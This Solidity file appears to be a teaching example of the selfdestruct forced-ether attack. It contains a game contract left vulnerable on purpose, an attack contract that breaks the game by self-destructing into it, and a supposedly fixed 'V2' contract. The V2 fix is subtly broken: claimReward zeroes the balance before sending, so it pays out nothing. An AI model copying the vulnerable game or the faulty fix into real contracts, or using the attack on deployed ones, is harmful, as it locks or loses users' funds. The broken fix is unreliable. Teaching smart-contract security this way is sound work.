// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IEtherGame {
    function deposit() external payable;
    function claimReward() external;
}

contract SelfDestructEtherGame {
    uint256 public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint256 balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract SelfDestructAttack {
    address etherGame;

    constructor(address _etherGame) {
        etherGame = _etherGame;
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether
        // cast address to payable
        address payable addr = payable(etherGame);
        selfdestruct(addr);
    }
}

contract SelfDestructEtherGameV2 {
    uint256 public targetAmount = 7 ether;
    uint256 public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        balance = 0;
        (bool sent,) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
